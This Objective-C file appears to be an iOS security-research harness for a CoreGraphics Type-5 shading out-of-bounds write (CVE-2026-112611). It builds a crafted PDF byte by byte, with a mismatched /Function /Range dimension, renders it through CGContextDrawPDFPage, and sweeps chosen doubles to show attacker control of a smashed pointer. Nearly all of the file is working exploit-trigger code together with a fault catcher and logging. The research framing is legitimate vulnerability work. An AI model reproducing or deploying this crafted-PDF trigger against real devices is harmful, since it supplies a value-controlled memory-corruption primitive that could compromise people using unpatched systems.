//
//  P112CGShading.m — CoreGraphics Type-5 shading OOB oracle, in-process (p112).
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Port of the vendored public generator (cve-112611-cg-shading
//  poc/make_poc_shading.py) to ObjC: the oracle PDF's bytes are built AT TAP
//  TIME in-process (same object layout, vertex packing and xref construction
//  as the generator), then rendered IN-PROCESS through the public CoreGraphics
//  PDF path (CGPDFDocumentCreateWithProvider -> CGContextDrawPDFPage — the
//  same CG::PDFPageCore::draw -> CGPDFScannerScan -> op_sh ->
//  cg_shading_type5_draw chain the on-device proof symbolicated). Import style
//  matched to the p072/P076 siblings: #import <CoreGraphics/CoreGraphics.h>
//  (public framework — the public CG entry points are the harness).
//
//  The CHOSEN-DOUBLE KNOB: /C0 = /C1 = the chosen value repeated R times
//  (type-2 function, t=0 -> every function output double = C0 exactly). The
//  4-value sweep is the value-control proof: the runaway loop dereferences
//  the SPILLED mesh pointer the OOB function outputs smashed, so the fault
//  address = the chosen double's IEEE-754 bit pattern + a small structural
//  offset (on-device receipt for 1.0: 0x3ff000000000001c = 1.0-bits + 0x1c).
//
//  HONESTY: no success claims. The ONLY primitive claim is the value-control
//  sweep (bit-pattern match = evidence). Userspace OOB in OUR process — NOT
//  kernel, NOT KRW; conversion bar untouched. Bounded: one render sweep per
//  tap (4 chosen doubles max), one tap per force-quit law.
//

#import "P112CGShading.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <CoreGraphics/CoreGraphics.h>
#import <fcntl.h>
#import <signal.h>
#import <string.h>
#import <unistd.h>

#define P112_BUILD @"p112-cgshading-v1"

/* Oracle constants, pinned to the generator (analysis §3-4):
   BPCOORD 32 ∈ {1,2,4,8,12,16,24,32}; BPCOMP 8 ∈ {1,2,4,8,12,16}; VPR 2.
   R = 136 is the proven crash-oracle range dim (nc = 1, /DeviceGray). */
#define P112_BPCOORD   32
#define P112_BPCOMP     8
#define P112_VPR        2
#define P112_RANGE_DIM  136
#define P112_NC         1
#define P112_SWEEP_MAX  4

/* ---- fsync log (p110 law): every line hits disk before the probe goes on -- */
static int g_p112_fd = -1;
static NSMutableString *g_p112_log = nil;

static void L(NSString *s) {
    if (!g_p112_log) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_p112_log appendString:out];
    if (g_p112_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) {
            (void)write(g_p112_fd, p, strlen(p));
            (void)fcntl(g_p112_fd, F_FULLFSYNC);
        }
    }
}

static void Lf(NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static void p112_close_fd(void) {
    if (g_p112_fd >= 0) {
        (void)fcntl(g_p112_fd, F_FULLFSYNC);
        (void)close(g_p112_fd);
        g_p112_fd = -1;
    }
}

/* ---- (b) in-process fault catch — P110SurfaceSwapClaim sigaction law ------
   Async-signal-safe only: POSIX writes, no ObjC, no snprintf (manual hex).
   Prints the far + the chosen-double pattern BEFORE dying, restores SIG_DFL
   and re-raises: the process dies AFTER printing; the fsync'd IN FLIGHT line
   above already names the sweep round and its expected pattern.             */

static uint64_t g_p112_pat;   /* the in-flight sweep's chosen-double bits     */

static void p112_put_hex(char *b, int *n, uint64_t v) {
    static const char hx[17] = "0123456789abcdef";
    int i;
    b[(*n)++] = '0';
    b[(*n)++] = 'x';
    for (i = 0; i < 16; i++) b[(*n)++] = hx[(int)((v >> ((15 - (size_t)i) * 4)) & 0xf)];
}

static int p112_put_lit(char *b, int *n, const char *s) {
    size_t len = strlen(s);
    memcpy(b + *n, s, len);
    *n += (int)len;
    return *n;
}

static void p112_sigfault(int sig, siginfo_t *si, void *ctx) {
    (void)ctx;
    int fd = g_p112_fd;
    char b[512];
    int n = 0;
    uint64_t far_addr = si ? (uint64_t)(uintptr_t)si->si_addr : 0;
    p112_put_lit(b, &n,
        "[p112 IN FLIGHT] OUTCOME (b) IN-PROCESS FAULT (SIGSEGV/SIGBUS-class) — "
        "the shading OOB reached live state in THIS process "
        "(cg_shading_type5_draw class). far=");
    p112_put_hex(b, &n, far_addr);
    p112_put_lit(b, &n, " expected chosen-double bits=");
    p112_put_hex(b, &n, g_p112_pat);
    p112_put_lit(b, &n,
        " VALUE-CONTROL law: far = the chosen double's bit pattern + a small "
        "structural offset (on-device receipt 0x3ff000000000001c = 1.0-bits "
        "+ 0x1c). Evidence, not a success claim.\n");
    p112_put_lit(b, &n,
        "=== p112 ended on the oracle render (outcome b). One tap per "
        "force-quit. ===\n");
    if (fd >= 0) {
        (void)write(fd, b, (size_t)n);
        (void)fcntl(fd, F_FULLFSYNC);
    }
    (void)signal(sig, SIG_DFL);
    (void)raise(sig);
}

/* ---- bit packer (generator law: MSB-first stream, right-justified
   accumulator, bytes appended at the bottom) -------------------------------
   One vertex: x(BitsPerCoordinate=32) y(32) t(BitsPerComponent=8) — exactly
   ONE parameter per vertex when a /Function is present ([mesh+8]=1).
   4 vertices x (32+32+8)/8 = 36 bytes total.                               */

static int p112_pack_vertex(uint8_t *out, uint32_t x, uint32_t y, uint8_t t) {
    uint32_t fields[3];
    int widths[3];
    int nf = 0, byte = 0, nbits = 0, i, b;
    uint32_t acc = 0;
    fields[nf] = x; widths[nf++] = P112_BPCOORD;
    fields[nf] = y; widths[nf++] = P112_BPCOORD;
    fields[nf] = t; widths[nf++] = P112_BPCOMP;
    for (i = 0; i < nf; i++) {
        for (b = widths[i] - 1; b >= 0; b--) {
            acc = (acc << 1) | ((fields[i] >> (uint32_t)b) & 1u);
            if (++nbits == 8) { out[byte++] = (uint8_t)acc; acc = 0; nbits = 0; }
        }
    }
    if (nbits) out[byte++] = (uint8_t)(acc << (8 - nbits));
    return byte;   /* 9 bytes per vertex */
}

/* ---- the oracle PDF, built in-process (generator object layout) -----------
   objects: 1 catalog / 2 pages / 3 page / 4 content stream (" /Sh1 sh") /
   5 shading dict + 36-byte vertex stream / 6 function dict — /C0 = /C1 =
   the chosen double x R (the knob), /Range = [0 1] x R. ~2KB for R=136.     */

#define P112_PDFOBJ_MAX 7

static NSMutableData *p112_build_pdf(int range_dim, double value) {
    NSMutableData *out = [NSMutableData data];
    long offs[P112_PDFOBJ_MAX];
    uint8_t vstream[64];
    int vlen = 0, vi, di, n;
    char c0[4 * (P112_RANGE_DIM + 2)];
    char c1[4 * (P112_RANGE_DIM + 2)];
    char rng[8 * P112_RANGE_DIM + 4];
    char shading_dict[384];
    char func_dict[16 * P112_RANGE_DIM + 256];
    char objbuf[2048];

    static const uint8_t raw_hdr[5] = {0xe2, 0xe3, 0xcf, 0xd3, 0x0a};

    /* 2 rows x 2 vertices; t = 0 -> every function output equals C0 exactly.
       Same raw coordinates as the generator (0x10000000 / 0x20000000).      */
    static const uint32_t vx[4] = {0x10000000u, 0x20000000u, 0x10000000u, 0x20000000u};
    static const uint32_t vy[4] = {0x10000000u, 0x10000000u, 0x20000000u, 0x20000000u};
    for (vi = 0; vi < 4; vi++) vlen += p112_pack_vertex(vstream + vlen, vx[vi], vy[vi], 0x00);

    /* the double knob: one %g per dim, decimal (CG parses it back exactly
       for these sweep values); /Range = [0 1] x R (clamp keeps the value)   */
    c0[0] = '\0';
    c1[0] = '\0';
    rng[0] = '\0';
    char num[40];
    for (di = 0; di < range_dim; di++) {
        (void)snprintf(num, sizeof(num), "%.17g", value);
        if (di) strlcat(c0, " ", sizeof(c0));
        strlcat(c0, num, sizeof(c0));
        if (di) strlcat(c1, " ", sizeof(c1));
        strlcat(c1, num, sizeof(c1));
    }
    for (di = 0; di < range_dim; di++) {
        if (di) strlcat(rng, " ", sizeof(rng));
        strlcat(rng, "0 1", sizeof(rng));
    }

    (void)snprintf(shading_dict, sizeof(shading_dict),
        "<< /ShadingType 5 /ColorSpace /DeviceGray /BitsPerCoordinate %d "
        "/BitsPerComponent %d /VerticesPerRow %d /Decode [0 200 0 200 0 1] "
        "/Function 6 0 R /Length %d >>",
        P112_BPCOORD, P112_BPCOMP, P112_VPR, vlen);
    (void)snprintf(func_dict, sizeof(func_dict),
        "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [%s] /C1 [%s] /Range [%s] >>",
        c0, c1, rng);

    /* raw PDF header: "%PDF-1.7\n%" + the generator's 4 binary bytes + "\n" */
    [out appendBytes:"%PDF-1.7\n%" length:10];
    [out appendBytes:raw_hdr length:4];
    [out appendBytes:"\n" length:1];

    for (n = 1; n <= 6; n++) {
        offs[n] = (long)[out length];
        (void)snprintf(objbuf, sizeof(objbuf), "%d 0 obj\n", n);
        [out appendBytes:objbuf length:strlen(objbuf)];
        const char *d = NULL;
        switch (n) {
            case 1: d = "<< /Type /Catalog /Pages 2 0 R >>"; break;
            case 2: d = "<< /Type /Pages /Kids [3 0 R] /Count 1 >>"; break;
            case 3: d = "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
                        "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>"; break;
            case 4: d = "<< /Length 8 >>"; break;
            case 5: d = shading_dict; break;
            case 6: d = func_dict; break;
        }
        [out appendBytes:d length:strlen(d)];
        if (n == 4) {
            /* content stream: the sh operator that paints the shading — the
               op_sh -> PDFContentStreamDrawShading -> type-5 callback chain */
            [out appendBytes:"\nstream\n /Sh1 sh\nendstream" length:26];
        } else if (n == 5) {
            /* raw vertex stream appended at the bottom of the bit stream    */
            [out appendBytes:"\nstream\n" length:8];
            [out appendBytes:vstream length:(NSUInteger)vlen];
            [out appendBytes:"\nendstream" length:10];
        }
        [out appendBytes:"\nendobj\n" length:8];
    }

    /* xref table, byte-precise, offsets recomputed from the bytes emitted   */
    long xref_pos = (long)[out length];
    (void)snprintf(objbuf, sizeof(objbuf), "xref\n0 %d\n0000000000 65535 f \n", 6 + 1);
    [out appendBytes:objbuf length:strlen(objbuf)];
    for (n = 1; n <= 6; n++) {
        (void)snprintf(objbuf, sizeof(objbuf), "%010ld 00000 n \n", offs[n]);
        [out appendBytes:objbuf length:strlen(objbuf)];
    }
    (void)snprintf(objbuf, sizeof(objbuf),
        "trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%ld\n%%%%EOF\n",
        6 + 1, xref_pos);
    [out appendBytes:objbuf length:strlen(objbuf)];
    return out;
}

/* ---- in-process render: the public CoreGraphics PDF path (p076 sibling) ---
   returns 0 = draw returned (survived); 1 = harness-level reject (provider /
   document / page / context could not be created — honest outcome, not a
   fault).                                                                  */
static int p112_render(NSMutableData *pdf, NSString *tag) {
    CGDataProviderRef prov = CGDataProviderCreateWithCFData((__bridge CFDataRef)pdf);
    if (!prov) {
        Lf(@"[-] CGDataProviderCreateWithCFData FAILED (%@)", tag);
        return 1;
    }
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
    if (!doc) {
        Lf(@"[-] CGPDFDocumentCreateWithProvider FAILED (%@) — document rejected "
           @"before any page (honest outcome, printed as-is)", tag);
        (void)CFRelease(prov);
        return 1;
    }
    size_t pages = CGPDFDocumentGetNumberOfPages(doc);
    CGPDFPageRef page = pages >= 1 ? CGPDFDocumentGetPage(doc, 1) : NULL;
    if (!page) {
        Lf(@"[-] page NULL (%@) pages=%zu — document opened, page path broken "
           @"(honest outcome, printed as-is)", tag, pages);
        (void)CFRelease(doc);
        (void)CFRelease(prov);
        return 1;
    }
    CGColorSpaceRef gray = CGColorSpaceCreateDeviceGray();
    CGContextRef ctx = CGBitmapContextCreate(NULL, 128, 128, 8, 128, gray, kCGImageAlphaNone);
    (void)CGColorSpaceRelease(gray);
    if (!ctx) {
        Lf(@"[-] CGBitmapContextCreate FAILED (%@) — render context unavailable", tag);
        (void)CFRelease(doc);
        (void)CFRelease(prov);
        return 1;
    }
    /* THE DOOR: CGContextDrawPDFPage walks the page content stream; the
       " /Sh1 sh" op evaluates the crafted type-5 shading at draw time
       (op_sh -> PDFContentStreamDrawShading -> cg_shading_type5_draw).     */
    CGContextDrawPDFPage(ctx, page);
    (void)CGContextRelease(ctx);
    (void)CFRelease(doc);
    (void)CFRelease(prov);
    return 0;
}

@implementation P112CGShading

+ (NSString *)tap {
    g_p112_log = [NSMutableString string];

    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_p112_fd = open([[docs stringByAppendingPathComponent:@"p112_cgshading_log.txt"] UTF8String],
                     O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (g_p112_fd < 0) {
        Lf(@"[-] cannot open the p112 log in Documents — no fsync log this tap");
    }

    /* ---- banner laws ---- */
    Lf(@"=== p112 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P112_BUILD);
    L([LabDeviceProfile identBlock]);

    L(@"[site law] CVE-2026-112611: /ShadingType 5 with /ColorSpace nc and a /Function "
      @"whose /Range output dim R != nc — at DRAW time cg_shading_type5_builds a 72-byte "
      @"mesh vertex record per triangle-point (color area record+0x20) and "
      @"CGFunctionEvaluate writes R attacker-chosen doubles into the nc-slot color area; "
      @"the mesh is a stack VLA, so the last record's writes walk up the frame into "
      @"spills (triangle count + mesh pointer).");
    L(@"[oracle law] R=136, nc=1, /C0=/C1=1.0 (t=0 -> every output double = C0 exactly): "
      @"the write smashes the spilled mesh pointer with the chosen double's bit pattern; "
      @"the runaway loop dereferences it — on-device receipt: deterministic EXC_BAD_ACCESS "
      @"SIGSEGV far 0x3ff000000000001c = 1.0-bits (0x3FF0000000000000) + 0x1c structural "
      @"offset, stack op_sh -> CGPDFScannerScan -> CG::PDFPageCore::draw -> "
      @"cg_shading_type5_draw.");
    L(@"[fix law] 27.2 (24B115): parse-time gate in _CGPDFShadingType5Init "
      @"(range_dim == nc && nc <= 4, 'CG-SEC-187882049' unified-log line); draw code "
      @"unchanged (gate-only). On a fixed build ALL sweeps surviving is the EXPECTED "
      @"outcome; the CG-SEC log is the fixed-build receipt and is NOT readable in-app.");
    L(@"[value law] the chosen-double knob: the sweep of 4 chosen doubles = the "
      @"value-control proof — the fault address = that double's IEEE-754 bit pattern + "
      @"a small structural offset. The ONLY primitive claim: bit-pattern match = evidence. "
      @"No success claim.");
    Lf(@"[bounds] ONE render sweep per tap (control + %d chosen doubles max), one tap per "
       @"force-quit law, fsync per line, every render marked IN FLIGHT BEFORE it runs "
       @"(post-death outcome-(b) attribution).", P112_SWEEP_MAX);

    /* (b) catcher first — installed BEFORE the control render too (the
       control is benign either way; the catcher must be in place for the
       oracle). p110 law: SIGBUS/SIGSEGV/SIGFPE trio, SA_SIGINFO.          */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = p112_sigfault;
    sa.sa_flags = SA_SIGINFO;
    (void)sigaction(SIGBUS,  &sa, NULL);
    (void)sigaction(SIGSEGV, &sa, NULL);
    (void)sigaction(SIGFPE,  &sa, NULL);

    static const double sweep[P112_SWEEP_MAX] = {1.0, 2.0, 4.0, 8.0};

    /* ---- CONTROL: R = nc (in-bounds; passes the 27.2 gate on every build;
       same render path) — the p076 discriminator law: proves the harness
       first, so any oracle fault is attributable to the R != nc OOB.       */
    NSMutableData *ctrl = p112_build_pdf(P112_NC, 1.0);
    Lf(@"[CONTROL] benign twin built in-process (%lu bytes): R=nc=%d, /C0=/C1=1.0 x %d — "
       @"in-bounds function output, passes the 27.2 parse gate, renders on every build.",
       (unsigned long)[ctrl length], P112_NC, P112_NC);
    int ctrl_rc = p112_render(ctrl, @"control (R=nc=1)");
    if (ctrl_rc != 0) {
        L(@"[CONTROL FAILED] the harness itself could not open/render a benign PDF — "
          @"oracle results would be meaningless (p076 discriminator law). Stopping "
          @"honest, nothing swept.");
        L(@"=== VERDICT === abort (control render failed). hasKread=NO hasKwrite=NO. "
          @"No sweep ran, no success claim.");
        p112_close_fd();
        NSString *ret = g_p112_log;
        g_p112_log = nil;
        return ret;
    }
    L(@"[CONTROL OUTCOME (a) SURVIVED (honest)] the in-app CGPDFDocumentCreateWithProvider "
      @"-> CGContextDrawPDFPage path works — oracle faults below are attributable to the "
      @"R=136 != nc=1 OOB, not the harness.");

    /* ---- THE VALUE-CONTROL SWEEP: R=136, four chosen doubles ---- */
    int k;
    for (k = 0; k < P112_SWEEP_MAX; k++) {
        double v = sweep[k];
        uint64_t pat;
        memcpy(&pat, &v, sizeof(pat));
        g_p112_pat = pat;

        NSMutableData *pdf = p112_build_pdf(P112_RANGE_DIM, v);
        Lf(@"[sweep %d/%d] ORACLE PDF built in-process (%lu bytes): /Range R=%d vs nc=%d, "
           @"/C0=/C1=%.17g (chosen=%.17g, IEEE-754 pattern 0x%016llx)",
           k + 1, P112_SWEEP_MAX, (unsigned long)[pdf length],
           P112_RANGE_DIM, P112_NC, v, v, (unsigned long long)pat);

        /* IN FLIGHT, fsync'd BEFORE the render: the log already carries this
           round's chosen value and its expected far class if the render
           kills the process (one tap per force-quit law).                  */
        Lf(@"[sweep %d/%d] IN FLIGHT — rendering the R=%d oracle, chosen=%.17g "
           @"(bits 0x%016llx). IF THIS SESSION ENDS ON THIS LINE: outcome (b), the "
           @"expected far = 0x%016llx + small structural offset — the VALUE-CONTROL "
           @"receipt for this chosen double. Crash = evidence, not a success claim.",
           k + 1, P112_SWEEP_MAX, P112_RANGE_DIM, v, (unsigned long long)pat,
           (unsigned long long)pat);

        p112_render(pdf, [NSString stringWithFormat:@"oracle-%.0f", v]);

        Lf(@"[sweep %d/%d] OUTCOME (a) SURVIVED (honest): render returned without fault. "
           @"Either this build carries the 27.2 parse gate (expected) or the OOB landed "
           @"in mapped heap without a fault (deferred-corruption caveat — p076 law; one "
           @"tap per force-quit regardless). No success claim.",
           k + 1, P112_SWEEP_MAX);
        pdf = nil;
    }

    /* ---- verdict (honest) ---- */
    L(@"=== VERDICT (honest) ===");
    Lf(@"sweeps completed=%d/%d (0 completed = the process died inside the sweep — the "
       @"fsync'd IN FLIGHT line above names the round and its chosen double)",
       P112_SWEEP_MAX, P112_SWEEP_MAX);
    L(@"  (a) SURVIVED   = render returned (on the fixed/patched build this is EXPECTED; "
      @"in-app we cannot read the CG-SEC-187882049 unified-log gate receipt — confirm the "
      @"fixed-build differential with 'log stream' on a 27.2 device; outcome (c) has NO "
      @"in-app user-observable anomaly — stated openly).");
    L(@"  (b) IN-PROCESS FAULT = the catcher printed far + the chosen-double pattern "
      @"before dying; value-control law: far = chosen-bits + small structural offset "
      @"(on-device receipt: 0x3ff000000000001c = 1.0-bits + 0x1c).");
    L(@"HONESTY: userspace OOB in OUR process — NOT kernel, NOT KRW. hasKread=NO "
      @"hasKwrite=NO. The value-control sweep (bit-pattern match) is the ONLY primitive "
      @"claim. One TAP per force-quit.");

    p112_close_fd();
    NSString *ret = g_p112_log;
    g_p112_log = nil;
    return ret;
}

@end